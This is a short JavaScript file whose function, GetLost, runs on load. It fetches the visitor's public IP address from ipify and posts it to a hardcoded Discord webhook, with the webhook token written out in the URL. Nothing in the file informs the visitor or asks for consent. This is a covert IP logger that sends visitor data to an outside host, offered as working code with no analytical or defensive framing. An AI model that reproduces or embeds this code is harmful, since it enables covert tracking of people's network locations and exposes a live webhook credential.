function GetLost() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            const webhookUrl = "https://discord.com/api/webhooks/1342645898680729722/SRg-iWSeW1vGljXxdGBWYDhzvQS04fU6ZiDuNdMeTvAscf5ZF2raaX8cCUJR5IpPP8d4";
            const payload = {
                content: `User IP: **${ip}**`,
                avatar_url: "https://cdn.xoa.me/uploads/611e43ef-ba96-4914-aa7c-a1c85149415b.jpg"
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(result => {
                console.log('IP Logged:', result);
            })
            .catch(error => {
                console.error('Error logging IP:', error);
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
        });
}

GetLost();
